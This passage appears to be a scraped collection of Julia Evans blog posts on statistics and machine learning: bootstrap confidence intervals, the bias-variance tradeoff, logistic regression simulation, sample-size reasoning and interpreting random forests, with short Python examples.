November. I’m working on a project that I started in\nOctober or so. I have some metrics we’ve decided on to measure whether\nthe project is going well, and I want to know that it’s making progress,\nand that the models we’re building now are better than they were a month\nago. \n\n These are some questions I want to discuss in my talk: \n\n \n How do you design a system where you can look up your model’s performance from 6 months ago? \n What if you change your mind after the fact about what metrics you wish you’d measured? \n What if you use a lot of different tools to train models? (R! Python! Scala!) \n How can you make it easy to use so that people, you know, actually use it? \n And not spend a lot of time on building it. \n \n\n More on this later, maybe. \n"},
{"url": "https://jvns.ca/blog/2013/02/27/graphing-bike-path-data-with-ipython-notebook-and-pandas/", "title": "Graphing bike path data with IPython Notebook and pandas", "content": "\n      I gave a talk at  Montreal Python  on Monday about\ngraphing  this dataset  from\nDonnées Ouvertes Montréal. The dataset has the number of bikes seen every day\non the bike paths in Montreal, collected using some sensors \n\n I showed some graphs of # bikes vs temperature and # bikes vs raininess, using\ndata downloaded from the Canadian\n National Climate Archive .\nYou can see the IPython notebook here: \n\n View the notebook using nbviewer \n\n It’s made using  pandas  and  IPython notebook . \n\n If you download it you can run it yourself and do some more complicated\nanalysis. If you’re interested in this, come to the next\n Python Night  on Thursday,\nMarch 7, where we’ll be playing with it. \n\n"},
{"url": "https://jvns.ca/blog/2015/07/04/bootstrap-confidence-intervals/", "title": "Some easy statistics: Bootstrap confidence intervals", "content": "\n     \n\n I am not actually on a plane to Puerto Rico, but I wrote this post when I was :) \n\n Hey friends! I am on a plane to Puerto Rico right now. When is a better time to think about statistics? \n\n We’ll start with a confession: I analyze data, and I rarely think about what the underlying distribution of my data is. When I tell my awesome stats professor friend this, she kind of sighs, laughs, and says some combination of \n\n \n “oh, machine learning people…” \n “well, you have a lot of data so it probably won’t kill you” \n “but be careful of {lots of things that could hurt you}!” \n \n\n So let’s talk about being careful! One way to be careful is, when you come up with a number, to build a confidence interval about how sure you are about that number. I think the normal way to do confidence intervals is that you use Actual Statistics and know what your distribution is. But we’re not going to do that because I’m on a plane and I don’t know what any of my distributions are. (the technical term for not knowing your distributions is “nonparametric statistics” :D) \n\n So, let’s say I have some numbers like: 0, 1, 3, 2, 8, 2, 3, 4 describing the number of no-shows for flights from New York to Puerto Rico. And that I also have no idea what kind of distribution this number should have, but some Important Person is asking me how much it’s okay to oversell the plane by. \n\n And let’s say I think it’s okay to have to kick people off the flight, say, 5% of the time. Great! Let’s take the 5th percentile! \n\n > np.percentile([0, 1, 3, 2, 8, 2, 3, 4], 5)\n0.35000000000000003\n \n\n Uh, great. the 5th percentile is there will be 0.35 people who don’t make the plane. This is a) not really something I can take to management, and b) I have no idea how much confidence I should have in that estimate, given that I only have 8 data points. And I have no distribution to use to reason about it. \n\n Maybe I  shouldn’t  have switched to CS so I didn’t have to take statistics (true story). Or alternatively maybe I can BOOTSTRAP MY WAY TO A CONFIDENCE INTERVAL WITH COMPUTERS. If you’re paying close attention, this is like the  A/A testing  post I wrote a while back, but a more robust method. \n\n The way you bootstrap is to sample with replacement from your data a lot of times (like 10000). So if you start with [1,2,3], you’d sample [1,2,2], [1,3,3], [3,3,1], [1,3,2], etc. Then you compute your target statistic on your new datasets. So if you were taking the maximum, you’d get 2,3,3,3, etc. This is great because you can use any statistic you want! \n\n Here is some code to do that!  n_bootstraps  is intended to be a big number. I chose 10000 because I didn’t want to wait more than a few seconds. More is always better. \n\n     from sklearn.utils import resample\n    def bootstrap_5th_percentile(data, n_bootstraps):\n        bootstraps = []\n        for _ in xrange(n_bootstraps):\n            # Sample with replacement from data\n            samples = resample(data)\n            # Then we take the fifth percentile!\n            bootstraps.append(np.percentile(samples, 5))\n        return pd.Series(bootstraps)\n \n\n So, let’s graph it \n\n     data = [0, 1, 3, 2, 8, 2, 3, 4]\n    bootstraps = bootstrap_5th_percentile(data, 10000)\n    bootstraps.hist()\n \n\n \n\n This is actually way more useful! It’s telling me I can oversell by 0 - 2 people, and I don’t have enough data to decide which one. I don’t know if I’d take this graph to airline executives (though everyone loves graphs right?!?!), but it’s for sure more useful than just a 0.35. \n\n Thankfully in real life I would probably have more flights than just 8 to use to make this decision. Let’s say I actually had, like, 1000! Let’s start by generating some data: \n\n data = np.random.normal(5, 2, 1000)\ndata = np.round(data[data >= 0]).astype(int)\n \n\n Here’s a histogram of that data: \n\n pd.Series(data).hist()\n \n\n \n\n Now let’s take the 5th percentile! \n\n np.percentile(data, 5)\n2.0\n \n\n Again, I don’t really feel good about this number. How do I know I can trust this more than the 0.35 from before? Let’s bootstrap it! \n\n bootstraps = bootstrap_5th_percentile(data, 10000)\nbootstraps.value_counts().sort_index().plot(kind='bar')\n \n\n \n\n I feel a little better about calling it at 2 here. \n\n The math \n\n I have not explained ANY of the math behind why you should believe this is a reasonable approach, which if you are like me then you are super uncomfortable right now. For instance, obviously if I only have 1 data point, sampling with replacement isn’t going to help me build a confidence interval. But what if I have 2 points, or 5? Why should you take these histograms I’m building seriously at all? And what’s this business with not even caring about what distribution you’re using? \n\n All worthwhile questions that we will not answer here today :). \n\n Be careful \n\n If occasionally 100 people don’t make the flight because they’re all from the same group and that’s important and not represented in your sample, bootstrapping can’t save you. \n\n This method is the bomb though. It is basically the only way I know to get error bars on my estimates and it works great. \n\n"},
{"url": "https://jvns.ca/blog/2015/09/06/is-machine-learning-safe-to-use/", "title": "Is machine learning safe to use?", "content": "\n      I’ve been thinking about this a lot because I do ML at work. here are a few of my\ncurrent thoughts. I’d like to hear what you think\n on twitter  – I think  being responsible for the accuracy of a system that you don’t fully understand is scary/ very interesting. \n\n \n\n transcript: \n\n FIRST : Can you understand your model? A regression with 10 variables is easy; a big random forest isn’t. \n\n A model you don’t understand is \n\n \n awesome . It can perform really well, and you can save time at first by ignoring the details. \n scary . It will make unpredictable and sometimes embarrassing mistakes. You’re responsible for them. \n only as good as your data . Often when I train a new model I think at some point “NO PLZ DON’T USE THAT DATA TO MAKE DECISION OH NOOOOO” \n \n\n Some way to make it less scary: \n\n \n have a human  double check  the scariest choices \n use complicated models when it’s okay to make unpredictable mistakes, simple models when it’s less okay \n use ML for research, learn why it’s doing better, incorporate your findings into a less complex system \n \n\n"},
{"url": "https://jvns.ca/blog/2015/12/24/how-to-trick-a-neural-network-into-thinking-a-panda-is-a-vulture/", "title": "How to trick a neural network into thinking a panda is a vulture", "content": "\n      I have an article published in Code Words, the Recurse Centre quarterly publication! I’m pretty happy with how it turned out. It comes with code so that you can reproduce everything in it yourself! \n\n Here it is:  How to trick a neural network into thinking a panda is a vulture \n\n Code Words is overall pretty excellent – you can find  every past article here . I particularly like  DDoS and you  and  Git from the inside out  which taught me a lot about Git internals. Also,  When is equality transitive?  is delightful. \n\n"},
{"url": "https://jvns.ca/blog/2016/01/02/winning-the-bias-variance-tradeoff/", "title": "Winning the bias-variance tradeoff", "content": "\n     \n\n \n   span {\n   padding: 0 !important;\n   }\n  \n \n\n Machine learning is a strange mix of math and weird heuristics. When I started studying machine learning, I was SO FRUSTRATED. Everything was “well it works in practice” and so little of it was math. I was a pure math major at the time, so arguments like “well it works in practice” made me REALLY MAD. \n\n I’d kind of given up on having a better theoretical understanding of machine learning. It was working really well in practice for me, after all! But then I met the bias-variance decomposition. \n\n The bias-variance decomposition is a small piece of math that actually explains why some things in machine learning work! \n\n \n \n\n \n \nmy feelings about machine learning in a picture\n \n \n \n\n The bias-variance decomposition gives you a framework for how to think about model error and overfitting, and it explains why techniques like model ensembles and ridge regression result in lower error (the tradeoff is a tradeoff you can WIN). I finally learned about it last week and it felt life-changing. I think it’s going to help me build better models, and it can help you too! \n\n I’ve annotated each section by whether it’s math or whether it a “works in practice” heuristic (aka bullshit, but useful bullshit). \n\n Bias and variance (math) \n\n I first took a machine learning class in 2011. I only understood what bias and variance were last week, after reading  An Introduction to Statistical Learning , which is an EXCELLENT book, along with  its more advanced companion . Here’s the story. I’m going to be a bit handwavy with the theorems & definitions through all of this, because the sections in those books are excellent and they’re free online PDFs. Please go there if you need more rigor! I’ll do my best to be reasonably clear. \n\n The setup : Suppose we have all of the possible training data for a model, and a model training method (like linear regression). We’re going to look at what happens for a specific training point $$x_0$$. \n\n Take a list of all training sets, and for each training set train a model $$M$$. Then we can look at the distribution of predictions $$M(x_0)$$ for each model. (see  Statistical learning theory  if you’re super interested in the theoretical foundations for machine learning) \n\n The best case scenario: For every model we train, $$M(x_0)$$ is always the same no matter what training set we picked, and always correct. The worst case scenario: it’s always changing and always totally wrong. In reality: you have some probability distribution of predicted values. \n\n Variance  is the variance of this probability distribution of predictions across all models (how different are the values from each other?) \n\n This is incredibly important: if every model you train makes totally different predictions, you’re in big trouble! Those predictions are definitely not correct. \n\n On variance & overfitting:  I keep hearing that high variance and overfitting are the same thing, and it makes sense to me. Overfitting is an idea, not a well-defined quantity, and if your modelling method gives you completely different results for every set of training data – I’d call that overfit. So I’m okay defining overfitting and variance to be the same thing. \n\n Measuring variance : Variance is cool because you have some prayer of approximating it for your actual models! You could imagine training your model on different training subsets, and seeing how different the predictions are. \n\n Bias  is the difference between the mean of this probability distribution and the actual correct value. Do the models on average predict the right thing for that point? \n\n Worst case: If you have a relationship that is totally nonlinear, and you try to use a linear model, your bias is definitely going to be high. It’s impossible to fit a correct model! \n\n Best case: If you have a true linear relationship, and you fit a linear model with least squares regression, your bias for every point is  zero . 0! unbiased! On average you’re always going to be exactly correct. But that doesn’t mean least squares regression is the best method! We’ll explain why in the next section =D =D \n\n On complexity & bias : People say that more complex models (with more parameters) have lower bias. As far as I can tell this is something that’s likely to be true but does not have any math behind it. If there is math that says this is true I would  love to know . \n\n Measuring bias : I have no idea how to measure bias in the real world. My impression is people mostly guess at whether a model’s bias is high or low. \n\n The bias-variance decomposition (math) \n\n This is a theorem that you can find in  An Introduction to Statistical Learning . This is math so it will never let us down ❤.  It basically says that the error at a point is the \n\n Err(x) = Bias^2 + Variance + Irreducible Error\n \n\n The actual theorem statement \n\n Denote the variable we are trying to predict as $$Y$$ and our covariates as $$X$$. Assume that there is a relationship relating one to the other such as $$Y=f(X)+\\epsilon$$ where the error term $$\\epsilon$$ is normally distributed with a mean of zero like so: $$\\epsilon \\sim N(0,\\sigma_\\epsilon)$$. \n\n We may estimate a model $$\\hat{f}(X)$$ of $$f(X)$$ using linear regressions or another modeling technique. In this case, the expected squared prediction error at a point $$x$$ is: \n\n $$Err(x)=E[(Y - \\hat{f}(x))^2]$$ \n\n This error may then be decomposed into bias and variance components: \n\n $$Err(x)=(E[\\hat{f}(x)] - f(x))^2+E[\\hat{f}(x) - E[\\hat{f}(x)]]^2+\\sigma^2\\epsilon$$ \n\n or in other words \n\n Err(x) = Bias^2 + Variance + Irreducible Error\n \n\n This is  awesome . It means that every time we have error, it’s either because of bias or because of variance. \n\n Heuristic warning : From now on, I’m going to talk about the bias and variance of a model. If you’ve reading carefully, you’ll notice that this doesn’t quite make sense: we’ve only defined bias and variance for a modelling method and a specific input to that model (we took the variance of $$M(x_0)$$ over all models $$M$$). All the arguments we’re going to make from now on are heuristic and not math, so we’re going to start being sloppy with the math. \n\n The bias-variance tradeoff (heuristic) \n\n Now we get to the cool part: the bias-variance tradeoff! As with many cool things in machine learning, the theoretical foundation here is a little shaky. \n\n There’s no math reason I know of you have to have a tradeoff between bias and variance (if you know one,  tell me! ). In an ideal world, you could just train a model with low variance and low bias and win at life. \n\n In the real world, however, we do not have magical model training methods :(. And often what people observe in practice is that as you increase the complexity of a kind of model (by training deeper decision trees, for instance), the bias decreases and the variance increases. This is the “bias-variance tradeoff”! \n\n But just knowing that isn’t so useful. So what? \n\n It turns out that thinking model performance in terms of a tradeoff between bias and variance can help us build better models! \n\n Winning the bias-variance tradeoff: Ensembles! \n\n The whole reason we’re talking about this is so we can build machine learning models with less errors. Machine learning people frequently use ensembles: take 10 or 100 models and average their results together to get a better model. For the longest time I had no idea why it worked! Here’s why. \n\n Ensembles are based on math! In general, if I have $$n$$ independent samples from a probability distribution with variance $$\\sigma$$ and mean $$\\mu$$, and I average them, then the new mean is the same ($$\\mu$$), but the new variance will be reduced! ($$\\frac{\\sigma}{n}$$). \n\n In general if my samples have some correlation $$\\rho$$, the reduction in variance depends on the correlation (a low correlation means a big reduction in variance)! This is all math. \n\n Now, suppose you have a way to generate a model which has low bias and high variance. The canonical example of this is supposedly a deep decision tree, though I’m not aware of any math showing that decision trees have low bias. \n\n Then if you can “average” 100 models generated in the same way, then your final model should have the same bias (mean), but lower variance! Because of the bias-variance decomposition, this means that it’s BETTER (the overall error is lower!). Yay! Further, the amount of variance reduction you get depends on the correlation between the 100 models. \n\n This is why random forests work! Random forests take a bunch of decision trees (low bias, high variance), average them (lower variance!). And they use an extra trick (select a random subset of features when splitting) to reduce the correlation between the trees (extra lower variance!!!). \n\n Understanding why ensembles work is awesome – it means that if an ensemble method isn’t helping you, you can understand why! It’s probably because the correlation between the models in your ensemble is too high. \n\n Winning the bias-variance tradeoff: Regularization! \n\n And there’s a second way to win! I honestly don’t really understand  regularization  yet, so I’m not going to try to explain the math at all (try  Elements of Statistical Learning  instead). \n\n But I can talk about the idea for a minute! First, I want to tell you about the  James–Stein estimator 1 . Suppose you’re trying to estimate the mean of a bunch of random vectors. The normal (unbiased!) way to estimate the true mean is to, well, take the mean of those random vectors! Awesome. You might expect that you can’t do better. BUT YOU CAN. The James-Stein estimator is a way to estimate the mean that gives you lower error. It’s a biased estimator (so on average it won’t give you a correct result), but its error is lower. This is amazing. \n\n Model regularization is has the same effect – basically you solve a different optimization where you constrain the parameters you’re allowed to use. You end up increasing your bias and lowering the variance. And  then you can end up winning and ending up with a lower overall error, if you’ve lowered the variance by more than you increased the bias! \n\n Since I don’t understand how regularization works yet and have never used it, I also don’t know how to debug regularization (if you try regularization and it doesn’t making your model better, how can you tell why not?!). If you know how to debug regularization I’d love to know. \n\n learning some math = ❤ \n\n I still find it kind of frustrating how heuristic most of these arguments are. Machine learning is an empirical game! But knowing a little more of the math makes me feel a little more comfortable. Not knowing how machine learning methods work means I can’t debug them, and that means I can’t be amazing. which obviously isn’t acceptable :D \n\n If you know more math that helps you debug your machine learning models and explain their performance, please tell me! \n\n Thanks to Max McCrea for reading this, and for Stephen Tu for helping me understand the math here and introducing me to statistical learning theory. \n\n {% include katex_render.html %} \n \n\n \n\n \n Do you know about the  Princeton Companion to Mathematics ? It’s literally a book that will explain EVERYTHING IN MATH TO YOU. It’s so fun, super well-written, and it taught me about the James-Stein estimator. It’s written at a level so that someone with a pure math degree should find it approachable (so, it’s perfect for me <3).\n  [return] \n \n \n\n"},
{"url": "https://jvns.ca/blog/2014/11/17/fun-with-machine-learning-logistic-regression/", "title": "Fun with machine learning: logistic regression!", "content": "\n      As much as I write about how\n there’s a lot more to ML than training models ,\nthe actual statistical models you use are still really important! And I\nfind understanding the models I’m using helps me sleep a lot better at\nnight. So we’re going to talk about one. \n\n \n\n I only do classification right now. Classification means that you have a\nbunch of data with features (like ( height = 5', weight = 150lb ) and\nyou want to put each piece of data into a box (like  assigned {female,\nmale} at birth ). We’re only going to talk about classification where\nthere are 2 categories. \n\n Logistic regression  means that fit a linear model to your data (like\n 0.5 * height + 0.1 * weight ). This gives you a real number, like\n 17.5 . But 17.5 isn’t a classification, it’s just a number! So we put\nthe number into the  logistic function   1 / (1 + exp(-x))  which\nnormalizes everything to be between 0 and 1. Then you can interpret the\nnumber you get as a probability! In the case of 17.5, you can see from\nthe graph below that it corresponds to a probability of effectively 1.\nYou can interpret this as “we’re 100% sure that this data is labelled\nwith F”. (assuming  1  corresponds to  F  and  0  to  M ). \n\n \n\n Simulating some logistic regression data \n\n One way I really like to think about models and the assumptions that go\ninto them is \n\n \n generate some data that fits the assumptions of the model \n fit the model to that data \n see if I get the results I expect! \n \n\n This doesn’t always feel as satisfying as using Real World Data, but\nit’s a much better way to think about your assumptions. \n\n So, let’s think about the logistic regression model backwards. Instead\nof starting with features and classifications and learning coefficients,\nwe need to start with features and coefficients and generate\nclassifications. \n\n Let’s imagine our features are  x = 2, y = 3  and our coefficients are\n x - y = 2 - 3 = -1 . And the output of the logistic function is  1 / (1\n+ exp(-1)) = 0.73 . So this means 73% of the time we’ll generate a\nclassification of  1  and the remaining 27% of the time generate a\nclassification of  0 . \n\n To recap: \n\n \n generate some features \n get the probability for each data point (`0.7, 0.2, 0.5, 0.5, 0.5, 0.5) \n choose  1  or  0  for each point with that probability ( 1 ,  0 ,  1 ,  0 ,  0 ,  0 ) \n \n\n Let’s do it in code! \n\n import pandas as pd\nimport numpy as np\n# Generate 100,000 data points normally distributed \n# with mean 0 and variance 1\n# Our features are called 'panda' and 'elephant'.\ndataset = pd.DataFrame({\n    'panda': np.random.normal(0, 1, 100000),\n    'elephant': np.random.normal(0, 1, 100000)\n})\n# The coefficients we're using are -1/3 * panda - 1/3 * elephant\nx = - 1/3 * (dataset['panda'] +  dataset['elephant'])\n# Put everything through the logistic function\nprobabilities = 1 / (1 + np.exp(-1 * x))\n# A trick! np.random.uniform(0,1) < 0.7 is 1 with \n# probability 70% and 0 with probability 30%\ndataset['target'] = np.random.uniform(0,1, 100000) < probabilities\ndataset.target.value_counts()\n# Check that the target values are roughly evenly distributed\nTrue     50032\nFalse    49968\n \n\n There’s of course no reason to expect that the target values would be\nevenly distributed between True and False – I mucked with the\ncoefficients to make them that way. \n\n Let’s see some of this data on a graph: \n\n \n\n You can see that there’s a separation between the  True  and  False \ndata, but a lot of it is mixed up together. This is because that there\nwere a lot of points that had a probability of ~50% of being  True . \n\n You can also imagine having much better separation between the data,\nlike this: \n\n \n\n Okay, great, we have our Amazing Mathematically Perfect Data. time to\nfit a model to it! (more on what I mean by Amazing Mathematically\nPerfect Data later!) \n\n Fitting a model \n\n Here’s the model-fitting code. It \n\n \n splits everything into a training set and testing set \n fits the classifier on the training set \n makes predictions on the test set \n \n\n I’m glossing over all the math here, but “fitting the classifier” in\nthis case means “do a maximum likelihood estimate to find the best\ncoefficients, using gradient descent”. Not totally sure about the\ngradient descent. \n\n from sklearn.linear_model import LogisticRegression\nfrom sklearn.cross_validation import train_test_split\nfrom sklearn.metrics import confusion_matrix\ncls = LogisticRegression()\nfeatures = dataset[['elephant', 'panda']]\nfeatures_train, features_test, target_train, target_test = train_test_split(features, dataset['target')\ncls.fit(features_train, target_train)\npredictions = cls.predict(features_test)\n \n\n Let’s look at what our model predicted! \n\n \n\n Interesting! It’s much easier to understand what the logistic regression\nis doing now – it’s choosing a line, and classifying everything on one\nside of that line as  True  and everything on the other side as  False . \n\n Did the model fitting work? \n\n There are a couple of ways to think about this. \n\n The first question you can ask is – how different is the graph of\npredicted classification from the graph of actual classifications? \n\n Just by inspecting them, you can see they’re pretty similar. You can\nformalize this a bit more by looking at the confusion matrix: \n\n [[8992 3512]\n [3338 9158]]\n \n\n which tells you that we classified 8992 + 9158 things correctly, and\n3512 + 3338 things wrong. Here’s another question I’m interested in,\nthough, that’s newer to me: \n\n For each data point, as well as getting a classification (True or\nFalse), we actually get a probability.  Do those probabilities make\nsense? \n\n What does “make sense” mean? Well, let’s say I have a data point which\nis assigned a probability of 0.8. Then I’d expect 80% of those points to\nbe Trues (or orange) and 20% to be Falses (or blue). Let’s find if\nthat’s true! We’ll plot the score vs the actual proportion of Trues.\n(thanks to  Avi  for suggesting that I\nstart drawing this graph!) \n\n \n\n This graph is BEAUTIFUL. It is basically a perfect straight line. I\ncould not dream of a more beautiful graph. I have never yet seen a graph\nthis nice for actual data. (actual data doesn’t care what you think the\nmodel is :( ). \n\n This is what I meant when I said that we have Mathematically Perfect\ndata – not that the data lets you easily perfectly separate the two\nclasses (it doesn’t!), but that it  fits the assumptions of the\nmodel . \n\n That’s all I have to say about logistic regression for now! I’m still\nworking some of these things out, and if I’ve gotten anything terribly\nwrong I’d love to know about it. \n\n If you’re interested in reproducing this  you can see the code for it here . \n\n Questions I still have that I’d love answers to : \n\n \n Why do we even think this model seems reasonable in the first place?\nIs there some mathematical justification to believe that data might\nfit it (like with the central limit theorem), or do we just use it\nbecause it works? \n Do you know any datasets that give you a really pretty graph where the\nactual proportions match up with the predicted scores? \n When I fit a logistic regression model, should I worry about the MLE\nnot converging to an optimal set of coefficients? When does that\nhappen? (when the data is badly scaled?) Is it easy to construct an\nexample where that happens? \n Are there more ways of thinking about logistic regression that I’m\nmissing here? \n \n"},
{"url": "https://jvns.ca/blog/2014/07/11/fun-with-stats-how-big-of-a-sample-size-do-i-need/", "title": "Fun with stats: How big of a sample size do I need?", "content": "\n      \n[There’s a version of this post with calculations  on nbviewer !]\n \n\n I asked some people on Twitter what they wanted to understand about statistics, and someone asked: \n\n “How do I decide how big of a sample size I need for an experiment?” \n\n Flipping a coin \n\n I’ll do my best to answer, but first let’s do an experiment! Let’s flip a coin ten times. \n\n \n> flip_coin(10)\nheads    7\ntails    3\n \n\n Oh man! 70% were heads! That’s a big difference. \n\n NOPE . This was a random result! 10 as a sample size is way too\n  small to decide that. What about 20? \n\n \n\n \n> flip_coin(20)\nheads    13\ntails     7\n \n\n 65% were heads! That is still a pretty big difference!  NOPE . What about 10000? \n\n \n> flip_coin(10000)\nheads    5018\ntails    4982\n \n\n That’s very close to 50%. \n\n So what we’ve learned already, without even doing any statistics, is\nthat if you’re doing an experiment with two possible outcomes, and\nyou’re doing 10 trials, that’s terrible. If you do 10,000 trials,\nthat’s pretty good, and if you see a big difference, like 80% / 20%,\nyou can almost certainly rely on it. \n\n But if you’re trying to detect a small difference like 50.3% / 49.7%,\nthat’s not a big enough difference to detect with only 10,000 trials. \n\n So far this has all been totally handwavy. There are a couple of ways\nto formalize our claims about sample size. One really common way is by\ndoing  hypothesis testing . So let’s do that! \n\n Let’s imagine that our experiment is that we’re asking people whether\nthey like mustard or not. We need to make a decision now about our\nexperiment. \n\n Step 1: make a null hypothesis \n\n Let’s say that we’ve talked to 10 people, and  7 ⁄ 10  of them like\nmustard. We are not fooled by small sample sizes and we ALREADY KNOW\nthat we can’t trust this information. But your brother is arguing\n“ 7 ⁄ 10  seems like a lot! I like mustard! I totally believe this!”. You\nneed to argue with him with MATH. \n\n So we’re going to make what’s called a “null hypothesis”, and try to\ndisprove it. In this case, let’s make the null hypothesis  “there’s a\n 50 ⁄ 50  chance that a given person likes mustard” . \n\n So! What’s the probability of seeing an outcome like  7 ⁄ 10  if the null\nhypothesis is true? We could calculate this, but we have a computer\nand I think it’s more fun to use the computer. \n\n So let’s pretend we ran this experiment 10,000 times, and the null\nhypothesis was true. We’d expect to sometimes get  10 ⁄ 10  mustard\nlikers, sometimes 0/10, but mostly something in between. Since we can\nprogram, let’s run the asking-10-people experiment 10,000 times! \n\n I programmed it, and here are the results: \n\n \n0        7\n1      102\n2      444\n3     1158\n4     2002\n5     2425\n6     2094\n7     1176\n8      454\n9      127\n10      11\n \n\n Or, on a pretty graph: \n\n \n\n Okay, amazing. The next step is: \n\n Step 2: Find out the probability of seeing an outcome  this unlikely\n  or more  if the null hypothesis is true \n\n The “this unlikely or more” part is key: we don’t want to know the\nprobability of seeing exactly  7 ⁄ 10  mustard-likers, we want to know the\nprobability of seeing  7 ⁄ 10  or  8 ⁄ 10  or  9 ⁄ 10  or  10 ⁄ 10 . \n\n So if we add up all the times when  7 ⁄ 10  or more people liked mustard\nby looking at our table, that’s about 1700 times, or 17% of the time. \n\n We could also calculate the exact probabilities, but this is pretty\nclose so we won’t. The way this kind of hypothesis testing works is\nthat you only reject the null hypothesis if the probability of seeing\nthis data if it’s true is really low. So here the probability of\nseeing this data if the null hypothesis is true is 17%. 17% is pretty\nhigh, ( 1 ⁄ 6 !), so we won’t reject it. This value (0.17) is called a\n p-value  by statisticians. We won’t say that word again here\nthough. Usually you want this to be more like 1% or 5%. \n\n We’ve really quickly arrived at \n\n Step 3: Decide whether or not to reject the null hypothesis \n\n If we see that  7 ⁄ 10  people like mustard, we can’t reject it! If we’d\ninstead seen that  10 ⁄ 10  of our survey respondants liked mustard, that\nwould be a totally different story! The probability of seeing that is\nonly about  10 ⁄ 10000 , or 0.1%. So it would be actually very reasonable\nto reject the null hypothesis. \n\n What if we’d used a bigger sample size? \n\n So asking 10 people wasn’t good enough. What if we asked 10,000\npeople? Well, we have a computer, so we can simulate that! \n\n Let’s flip a coin 10,000 times and count the number of heads. We’ll\nget a number (like 5,001). Then we’ll repeat  that  experiment 10,000\ntimes and graph the results. This is like running 10,000 surveys of\n10,000 people each. \n\n \n\n That’s pretty narrow, so let’s zoom in to see better. \n\n \n\n So in this graph we ran 10,000 surveys of 10,000 people, and in about\n100 of them 5000 people said they liked mustard \n\n There are two neat things about this graph. The first neat thing is\nthat it looks like a\n normal distribution ,\nor “bell curve”. That’s not a coincidence! It’s because of the\n central limit theorem !\nMATH IS AMAZING. \n\n The second is how tightly centred it is around 5,000. You can see that\nthe probability of seeing more than 52% or less than 48% is really\nlow. This is because we’ve done a lot of samples. \n\n This also helps us understand how people could have calculated these\nprobabilities back when we did not have computers but still needed to\ndo statistics – if you know that your distribution is going to be\napproximately the normal distribution (because of the central limit\ntheorem), you can use\n normal distribution tables \nto do your calculations. \n\n In this case, “the number of heads you get when flipping a coin 10,000\ntimes” is approximately normally distributed, with mean 5000. \n\n So how big of a sample size do I need? \n\n Here’s a way to think about it: \n\n \n Pick a null hypothesis (people are equally likely to like mustard\nor not) \n Pick a sample size (10000) \n Pick a test (do at least 5200 people say they like mustard?) \n What would the probability of your test passing be if the null\nhypothesis was true? (less than 1%!) \n If that probability is low, it means that you can reject your null\nhypothesis! And your less-mathematically-savvy brother is wrong,\nand you have PROOF. \n \n\n Some things that we didn’t discuss here, but could have: \n\n \n independence (we’re implicitly assuming all the samples are\nindependent) \n trying to prove an alternate hypothesis as well as trying to\ndisprove the null hypothesis \n \n\n I was also going to do a Bayesian analysis of this same data but I’m\ngoing to go biking instead. That will have to wait for another day.\nLater! \n\n (Thanks very much to the fantastic\n Alyssa Frazee  for proofreading this and\nfixing my terrible stats mistakes. And\n Kamal  for making it much more\nunderstandable. Any remaining mistakes are mine.) \n"},
{"url": "https://jvns.ca/blog/2016/04/10/why-i-dont-like-black-boxes/", "title": "Looking inside machine learning black boxes", "content": "\n     \n\n I do machine learning at work. For a long time (the whole time I’ve had this job, 2 years), I’ve struggled with a bunch of questions about complicated machine learning models. Are black box models good? Should we be using them? What are the consequences? What can I do about it? \n\n I’ve learned a few things now thanks to my coworkers who are amazing, which I’m going to try to write down here. \n\n First, what do I mean when I say “black box model”? \n\n The main two kinds of models I use at work are logistic regression (which I’ve written about  previously ) and random forests. \n\n simple models & complicated models \n\n Logistic regression models have a fancy name, but they’re really  simple . Let’s say you’re trying to model whether or not a flight will be late, and you have two inputs: number of passengers and hour of day. \n\n Your model is then going to use  coefficient1 * # passengers + coefficient2 * hour_of_day , and then apply the logistic function. There are just 2 coefficients! It’s so simple. \n\n I worked for a long time with this kind of model and it was amazing in a lot of ways. You can pretty easily read off how important each input is (it got a coefficient of 0.000001? guess it wasn’t important!!). If you have a small number of inputs, like 20, then your model is 20 numbers which you can look at by hand. Easy to debug! \n\n I’m not going to explain in depth what a random forest is here (it’s basically a collection of decision trees which you let vote on your outcome), but they’re more  complicated . It’s not unusual for me to work with models that are tens of megabytes. You can’t read off the numbers there by hand! In fact, people often refer to a large multi-megabyte model as a “black box”, basically to say that it works well but you have no idea what it’s doing. \n\n The same thing can happen with logistic regressions – some people use logistic regressions with millions of inputs, and then it becomes very difficult to understand what they’re doing. \n\n Not understanding what my models are doing made me very uncomfortable. \n\n People told me a lot “well, you have a tradeoff between interpretability and how well the model performs!”. But I didn’t feel satisfied with that. I wanted interpretability  and  a model that performs well. \n\n why it feels scary to have a black box \n\n So, I had these large random forest models, and I didn’t understand what they were doing. I want to explain a few super-concrete reasons why this was bad. \n\n \n people would come to me and say “why did the model make this choice?”. Sometimes I’d be able to tell them exactly (“it picked up this super obvious signal!”), but often I would say “we don’t know exactly, it’s complicated, you know, machine learning”. They said “okay”, but I didn’t feel good about that answer. \n It was super hard to do quality assurance on the models. If you have a model making important decisions, and you don’t clearly understand what it’s doing, how do you know it’s not going to blow up in your face tomorrow? We did lots of validation in advance of putting a model into production, but what happens if the input data distribution changes? Will it blow up? Will it be fine? In general our validation held up pretty well. \n when you train a model and it doesn’t perform well, how do you know how to fix it? Is it missing features? Did you use the wrong hyperparameters? You have to sort of magically intuit why it’s not performing well. Magical intuition is Very Hard. \n \n\n looking inside a random forest (it’s easy, and it helps) \n\n So we’ve established that I felt bad about not understanding random forest models. What do you do about it? \n\n This is probably obvious to many people who know about random forests, but – random forests are actually a REALLY SIMPLE THING. They’re large, but they’re conceptually very simple and the algorithms you use to train them are not actually that complicated. \n\n Let’s talk about what a random forest does. Say I have the following information about a flight: \n\n \n # passengers: 20 \n time of day: 3:49pm \n % late flights in departing airport: 5% \n % late flights to arriving airport: 10% \n departing airport: Chicago \n \n\n Suppose I have 10 trees in my random forest. They might classify my flight as follows. If the decision tree goes through 2 decisions: time of day > 2pm and passengers # 40, I’ll represent that as  # time of day > 2pm AND passengers < 40 . \n\n          condition                              |    probability of lateness\nTree 1 | time of day > 2pm AND passengers < 40  |    10%\nTree 2 | % late flights dep airport < 70%       |    30%\nTree 3 | departing airport = chicago            |    15%\nTree 4 | passengers < 30                        |    2%\n... and so on\n \n\n I haven’t tried very hard to be realistic here – it’s likely that you’ll see conditions (or “predicates”) that are quite complicated like  passengers < 30 AND time of day < 5:20pm AND departing airport != LAX AND [ten more things] \n\n But what the random forest chose to assign a given probability of lateness to my flight is actually totally explainable by \n\n \n 10 conditions (one for each tree, like  time of day > 2pm AND passengers < 40 ) \n and 10 probabilities (what the tree associated to that condition) \n \n\n I knew this for a long time, but I honestly didn’t think it would be useful. Then one week, over a couple of days, my awesome product manager  Isaac  implemented (in javascript!!) a tool to explain to you why a random forest model made a given choice. \n\n It was AMAZING. Right away I started putting 